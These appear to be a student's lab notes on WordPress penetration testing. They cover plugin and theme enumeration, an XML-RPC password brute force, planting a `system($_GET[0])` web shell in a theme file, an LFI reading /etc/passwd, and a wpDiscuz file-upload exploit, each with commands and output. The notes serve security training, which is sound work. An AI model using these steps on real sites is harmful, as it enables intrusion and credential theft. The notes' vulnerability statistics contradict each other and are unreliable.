Wordpress launched in 2003 and SEO friendly provide more then 50k plugins, 317 wordpress versions launched.
Wordpress has 4k+ known vuln, 54% plugins, 31.5% are in wp and 14% in thesmes.

## Discovery
Always check for `robots.txt` file.
```bash
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

Sitemap: https://inlanefreight.local/wp-sitemap.xml
```

`wp-content` directory contain themes and plugins etc. `wp-content/plugins` contain plugins and `wp-content/themes` help to find vulnerable themes.

It has mainly 5-types of users.
```
1. Administrator: This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code.
2. Editor: An editor can publish and manage posts, including the posts of other users.
3. Author: They can publish and manage their own posts.
4. Contributor: These users can write and manage their own posts but cannot publish them.
5. Subscriber: These are standard users who can browse posts and edit their profiles.
```

## Enumeration
To check site built on wordpress or not.
```bash
curl -s http://blog.inlanefreight.local | grep WordPress
```

Here we enumerate for theme being used.
```bash
curl -s http://blog.inlanefreight.local/ | grep themes

<link rel='stylesheet' id='bootstrap-css'  href='http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/vendors/bootstrap/css/bootstrap.min.css' type='text/css' media='all' />
```

Same here for plugin.
```bash
curl -s http://blog.inlanefreight.local/ | grep plugins

<link rel='stylesheet' id='contact-form-7-css'  href='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' />
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.8' id='subscriber-js-js'></script>
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.8' id='validation-engine-en-js'></script>
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.8' id='validation-engine-js'></script>
		<link rel='stylesheet' id='mm_frontend-css'  href='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/css/mm_frontend.css?ver=5.8' type='text/css' media='all' />
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.4.2' id='contact-form-7-js'></script>
```

Let's dig around a bit more. Checking the page source of another page, we can see that the [wpDiscuz](https://wpdiscuz.com/) plugin is installed, and it appears to be version 7.0.4
```bash
curl -s http://blog.inlanefreight.local/?p=1 | grep plugins

<link rel='stylesheet' id='contact-form-7-css'  href='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' />
<link rel='stylesheet' id='wpdiscuz-frontend-css-css'  href='http://blog.inlanefreight.local/wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4' type='text/css' media='all' />
```

We can do some manual enumeration of users as well. As mentioned earlier, the default WordPress login page can be found at `/wp-login.php`. So check for user enumeration on wordpress `/wp-login.php` page.

WPScan is also able to pull in vulnerability information from external sources. We can obtain an API token from [WPVulnDB](https://wpvulndb.com/), which is used by WPScan to scan for PoC and reports. The free plan allows up to 75 requests per day.

```bash
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>
```

WPScan uses various passive and active methods to determine versions and vulnerabilities, as shown in the report above. The default number of threads used is `5`. However, this value can be changed using the `-t` flag. We can find wordpress users using this.

XMLrpc and REST API are being used in wordpress since 2003. XMLrpc help the wordpress website to communicate with mobile apps and other websites. But its interduce some vulns. Before version 3.5 XMLrpc where disable by defaul and after this its enabled. wordpress now has been shifted to REST Api so xmlrpc should be disabled.

XMLrpc enabled [trackbacks](https://kinsta.com/knowledgebase/what-is-a-trackback/) and [pingbacks](https://kinsta.com/knowledgebase/what-is-a-pingback/), and it powered the [Jetpack plugin](https://kinsta.com/knowledgebase/wordpress-jetpack/) which links a [self-hosted WordPress site to WordPress.com](https://kinsta.com/blog/wordpress-com-vs-wordpress-org/).

xmlrpc.php file exist in root directory. Use wordpress plugin or update .htaccess file to disable xmlrpc.

```bash
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local

[+] URL: http://blog.inlanefreight.local/ [10.129.42.195]
[+] Started: Wed Aug 25 11:56:23 2021

<SNIP>

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - john / firebird1                                                                                           
Trying john / bettyboop Time: 00:00:13 <                                      > (660 / 14345052)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
```

**Bypasses login page protections:** XML-RPC doesn't go through the typical `wp-login.php`, so protections on that page (e.g., CAPTCHA, 2FA) may be bypassed unless also applied to XML-RPC.Instead of one request per login attempt, attackers can send 100s in one request.

After getting admin panel we can edit theme source code. so here we update the theme file 404.php.
```php
system($_GET[0]);
```

```bash
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The [wp_admin_shell_upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) module from Metasploit can be used to upload a shell and execute it automatically.
```bash
msf6 > use exploit/unix/webapp/wp_admin_shell_upload 
```

We also need to set `VHOST` if required.

 Metasploit module uploaded the `wCoUuUPfIO.php` file to the `/wp-content/plugins` directory. Many Metasploit modules (and other tools) attempt to clean up after themselves, but some fail.  It remove itsself or not but we need to add this in report.
- Exploited systems (hostname/IP and method of exploitation)
- Compromised users (account name, method of compromise, account type (local or domain))
- Artifacts created on systems
- Changes (such as adding a local admin user or modifying group membership)

Wordpress have more then 23k+ vuln in its databased.
- 4% WordPress core
- 89% plugins
- 7% themes
we can used waybackul to find plugins and  other thing that are exist but no enabled.
#### Vulnerable Plugins - mail-masta
Mail masta plugin is no longer supported but still its has lot downloads. It suffered LFI and SQL since 2016. No validation for SQL.
```php
<?php 

include($_GET['pl']);
global $wpdb;

$camp_id=$_POST['camp_id'];
$masta_reports = $wpdb->prefix . "masta_reports";
$count=$wpdb->get_results("SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1");

echo $count[0]->co;

?>
```

we can enumerate for LFI like this.
```bash
 curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

#### Vulnerable Plugins - wpDiscuz
WpDiscuz is used for commenting on blog sites and lead to RCE. It has more then 1M downlaods.
Based on the version number (7.0.4), this [exploit](https://www.exploit-db.com/exploits/49967) has a pretty good shot of getting us command execution. Its vulnerable to file upload. It only check Mime type in file. More on the mime type detection functions bypass can be found [here](https://www.wordfence.com/blog/2020/07/critical-arbitrary-file-upload-vulnerability-patched-in-wpdiscuz-plugin/).

The exploit script takes two parameters: `-u` the URL and `-p` the path to a valid post.
```bash
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1

---------------------------------------------------------------
[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
[-] File Upload Bypass Vulnerability - PHP Webshell Upload
[-] CVE: CVE-2020-24186
[-] https://github.com/hevox
--------------------------------------------------------------- 

[+] Response length:[102476] | code:[200]
[!] Got wmuSecurity value: 5c9398fcdb
[!] Got wmuSecurity value: 1 
```

It may show fail to run command but we can use curl.
```bash
curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id

GIF689a;

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```